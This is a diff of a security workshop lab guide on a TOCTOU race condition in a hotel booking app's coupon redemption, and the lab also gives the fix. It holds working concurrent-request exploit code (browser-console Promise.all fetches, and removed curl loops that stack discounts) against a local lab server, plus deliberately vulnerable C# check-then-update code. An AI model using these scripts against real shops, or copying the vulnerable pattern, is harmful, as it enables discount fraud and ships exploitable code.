@@ -2,7 +2,8 @@
 
 **Difficulty:** Intermediate  
 **Category:** Race Conditions / TOCTOU  
-**OWASP Top 10:** API4:2023 — Unrestricted Resource Consumption / A04:2021 — Insecure Design  
+**OWASP Top 10:** API4:2023 — Unrestricted Resource Consumption / A04:2021 — Insecure Design
+
 ---
 
 ## Scenario
@@ -39,7 +40,9 @@ The database is seeded with:
 | SAVE10   | 10%      | 1        |
 | SUMMER20 | 20%      | 3        |
 
-Log in as `partner / Partner1234!` at `http://localhost:5173`. Add any hotel to your cart from the **Hotels** page, then go to **Cart**.
+Log in as `partner / Partner1234!` at `http://localhost:5173`. Go to **Hotels**, pick any hotel, and add it to your cart. Then go to **Cart**.
+
+> **Important:** you must have a hotel item in your cart before applying coupons. The coupon section only appears when there is something to buy.
 
 In the **Checkout** section you'll see a coupon input. Enter `SUMMER20` and click **Apply**. The discount appears:
 
@@ -47,35 +50,68 @@ In the **Checkout** section you'll see a coupon input. Enter `SUMMER20` and clic
 SUMMER20 — 20% off
 ```
 
-Apply it two more times (you need to remove and re-enter the code each time). On the fourth attempt the server returns an error — `"Coupon has already been fully redeemed"` (`409 Conflict`). Three uses are exactly the limit.
+Apply it two more times (remove and re-enter the code each time). On the fourth attempt the server returns an error — `"Coupon has already been fully redeemed"` (`409 Conflict`). Three uses are exactly the limit.
 
-Now try the race condition: open a **second browser tab** to `http://localhost:5173/cart`. In both tabs, type `SAVE10` into the coupon box. Click **Apply** in both tabs as simultaneously as possible.
+Now exploit the race condition with `SAVE10` (limit: 1 use) using the browser console.
 
-If your timing is close enough, both return success and the cart shows:
+**Capture the request — do not proceed to checkout.** Open **DevTools → Network**. In the cart coupon box type `SAVE10` and click **Apply**. In the Network tab, right-click the `redeem` request → **Copy → Copy as Fetch**. You now have something like:
+
+```javascript
+fetch("http://localhost:5001/bff/coupons/redeem", {
+  "method": "POST",
+  "headers": { "content-type": "application/json" },
+  "body": "{\"code\":\"SAVE10\"}",
+  "credentials": "include"
+})
+```
+
+> **Do not proceed to checkout.** MFA is required to complete a purchase and will block you. The race condition is on coupon redemption only.
+
+**Reset the coupon** by clicking **Remove** on the applied coupon in the cart. This decrements `SAVE10` back to 0 uses — no DB reset needed.
+
+**Open the browser console** and fire both fetches simultaneously with `Promise.all`, then reload the page to see the result:
+
+```javascript
+Promise.all([
+  fetch("http://localhost:5001/bff/coupons/redeem", {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({ code: "SAVE10" }),
+    credentials: "include"
+  }),
+  fetch("http://localhost:5001/bff/coupons/redeem", {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({ code: "SAVE10" }),
+    credentials: "include"
+  })
+])
+.then(rs => Promise.all(rs.map(r => r.json())))
+.then(results => { console.log(results); location.reload(); });
+```
+
+Both requests fire in the same JavaScript tick — they land at the server while the 500 ms delay is still running. After the page reloads, the cart shows:
 
 ```
 SAVE10 — 10% off × 2 (race condition!)
 ```
 
-The compounded discount in the total confirms two redemptions slipped through. The timing window is 500 ms (artificially widened for the workshop), so two-tab clicking works reliably. In production the window is typically 5–15 ms — too small for manual clicks, requiring scripted concurrent requests.
-
-To reset the coupon state before continuing:
-
-```bash
-bash scripts/reset-db.sh
-```
+The timing window is 500 ms (artificially widened for the workshop). In production the window is 5–15 ms — still exploitable with `Promise.all` but not with manual clicking.
 
 ---
 
 ## Step 2 — Understand the vulnerable code
 
+A vulnerable implementation uses check-then-update:
+
 ```csharp
-// Time of Check (TOCTOU)
+// VULNERABLE — TOCTOU (Time of Check / Time of Use)
+// Time of Check
 var coupon = await _db.Coupons.FirstOrDefaultAsync(c => c.Code == request.Code);
 if (coupon.UsesCount >= coupon.MaxUses)
     return Conflict(...);
 
-// Race window — artificial 500 ms delay
+// Race window — 500 ms or more of real I/O latency in production
 await Task.Delay(500);
 
 // Time of Use — stale data may have already been overwritten by another request
@@ -87,96 +123,12 @@ The 500 ms delay is artificial and exists to make the race window exploitable in
 
 ---
 
-## Step 3 — Exploit the race condition
-
-Reset the database to restore coupon state:
-
-```bash
-bash scripts/reset-db.sh
-```
-
-Log in and send two requests simultaneously. Use `&` to background both before `wait`:
-
-```bash
-# Log in (cookie auth via BFF)
-curl -s -c cookies.txt -X POST http://localhost:5001/bff/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"partner","password":"Partner1234!"}' | jq .
-
-# Both requests land while the other is sleeping — both pass the check
-curl -s -b cookies.txt -X POST http://localhost:5001/bff/coupons/redeem \
-  -H "Content-Type: application/json" \
-  -d '{"code":"SAVE10"}' | jq . &
-
-curl -s -b cookies.txt -X POST http://localhost:5001/bff/coupons/redeem \
-  -H "Content-Type: application/json" \
-  -d '{"code":"SAVE10"}' | jq . &
-
-wait
-```
-
-Expected: **both return `200 OK`** with `"discountPercent": 10`, even though `MaxUses = 1`.
-
-Now check your cart:
-
-```bash
-curl -s -b cookies.txt http://localhost:5001/bff/cart | jq .
-```
-
-Expected cart state:
-
-```json
-{
-  "appliedCouponCode": "SAVE10",
-  "appliedCouponDiscountPercent": 10,
-  "appliedCouponCount": 2
-}
-```
-
-The server recorded **two redemptions**. At checkout the compound discount is applied:
-
-```
-$120.00  (base price)
-× 0.90   (first 10% off)  →  $108.00
-× 0.90   (second 10% off) →   $97.20
-```
-
-In the UI the coupon badge reads **"SAVE10 — 10% off × 2 (race condition!)"** and the cart total shows $97.20 instead of $108.00.
-
-This is the financial impact: the attacker extracted an extra $10.80 of discount that the coupon was never meant to grant.
-
----
-
-## Step 4 — Scale the attack
-
-With more parallelism, more discount stacks. Reset the database first so the coupon count is back to 0:
-
-```bash
-bash scripts/reset-db.sh
-
-# Log back in after the reset
-curl -s -c cookies.txt -X POST http://localhost:5001/bff/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"partner","password":"Partner1234!"}' | jq .
-
-for i in $(seq 1 5); do
-  curl -s -b cookies.txt -X POST http://localhost:5001/bff/coupons/redeem \
-    -H "Content-Type: application/json" \
-    -d '{"code":"SAVE10"}' | jq -r '.message' &
-done
-wait
-```
-
-Check the cart again — `appliedCouponCount` may be 3–5 (depends on how many requests beat the delay). Each additional application compounds: 5× at 10% = `$120 × 0.9⁵ = $70.87`.
-
----
-
-## Step 5 — How it works at runtime
+## Step 3 — How it works at runtime
 
 ```
 POST /bff/coupons/redeem (×2 concurrent, SAVE10 MaxUses=1)
         │
-        ├─ Vulnerable (TOCTOU)
+        ├─ Without the fix (TOCTOU)
         │       │
         │  Req 1: reads UsesCount=0 → 0 < 1 → check passes
         │  Req 2: reads UsesCount=0 → 0 < 1 → check passes   ← both pass simultaneously
@@ -188,7 +140,7 @@ POST /bff/coupons/redeem (×2 concurrent, SAVE10 MaxUses=1)
         │       │
         │       └─► both return 200 OK — coupon redeemed twice
         │
-        └─ Fixed: atomic UPDATE in DB
+        └─ With the fix: atomic UPDATE in DB
                 │
                 ▼
            UPDATE Coupons SET UsesCount = UsesCount + 1
@@ -198,17 +150,80 @@ POST /bff/coupons/redeem (×2 concurrent, SAVE10 MaxUses=1)
                 └─ Req 2 loses: 0 rows affected → 409 Conflict
 ```
 
-## The fix
+## Step 4 — Apply the fix
 
-The fixed code:
+**File:** `src/BookingDojo.Api/Controllers/CouponsController.cs`  
+**Method:** `Redeem`
 
-```sql
-UPDATE bookingdojo."Coupons"
-SET "UsesCount" = "UsesCount" + 1
-WHERE "Code" = @code AND "UsesCount" < "MaxUses"
+**Remove** the entire TOCTOU block:
+
+```csharp
+// VULNERABLE PATH (TOCTOU race condition)
+// Time of Check: read the coupon and validate remaining uses.
+var coupon = await _db.Coupons.FirstOrDefaultAsync(c => c.Code == request.Code);
+if (coupon == null)
+    return NotFound(new { message = $"Coupon '{request.Code}' not found" });
+
+if (coupon.UsesCount >= coupon.MaxUses)
+    return Conflict(new { message = "Coupon has already been fully redeemed" });
+
+// Artificial delay widens the race window
+await Task.Delay(500);
+
+// Time of Use: a concurrent request may have already incremented this.
+coupon.UsesCount++;
+await SetCartCoupon(request.Code, coupon.DiscountPercent);
+await _db.SaveChangesAsync();
+
+return Ok(new { discountPercent = coupon.DiscountPercent, message = "Coupon applied" });
 ```
 
-The database evaluates the `WHERE` condition and performs the increment atomically within a single statement. Both concurrent requests race to run this statement, but only the one that gets there first satisfies `UsesCount < MaxUses`; the other sees 0 rows affected and receives a 409.
+**Replace with:**
+
+```csharp
+var rows = await _db.Database.ExecuteSqlRawAsync(
+    "UPDATE bookingdojo.\"Coupons\" " +
+    "SET \"UsesCount\" = \"UsesCount\" + 1 " +
+    "WHERE \"Code\" = {0} AND \"UsesCount\" < \"MaxUses\"",
+    request.Code);
+
+if (rows == 0)
+    return Conflict(new { message = "Coupon has already been fully redeemed" });
+
+var coupon = await _db.Coupons.FirstOrDefaultAsync(c => c.Code == request.Code);
+await SetCartCoupon(request.Code, coupon!.DiscountPercent);
+
+return Ok(new { discountPercent = coupon.DiscountPercent, message = "Coupon applied" });
+```
+
+The `UPDATE ... WHERE UsesCount < MaxUses` is a single atomic statement. Both concurrent requests race to execute it, but the database only increments once — whichever request gets there first satisfies the `WHERE` condition; the other sees 0 rows affected and receives 409.
+
+---
+
+## Step 5 — Verify
+
+Click **Remove** on any applied coupon to reset to 0 uses, then run the same `Promise.all` from the browser console:
+
+```javascript
+Promise.all([
+  fetch("http://localhost:5001/bff/coupons/redeem", {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({ code: "SAVE10" }),
+    credentials: "include"
+  }),
+  fetch("http://localhost:5001/bff/coupons/redeem", {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({ code: "SAVE10" }),
+    credentials: "include"
+  })
+])
+.then(rs => Promise.all(rs.map(r => r.json())))
+.then(results => { console.log(results); location.reload(); });
+```
+
+Expected console output: **one `"Coupon applied"`** and **one `"Coupon has already been fully redeemed"`**. After the page reloads the cart shows a single `SAVE10 — 10% off` with no duplication.
 
 ---
 
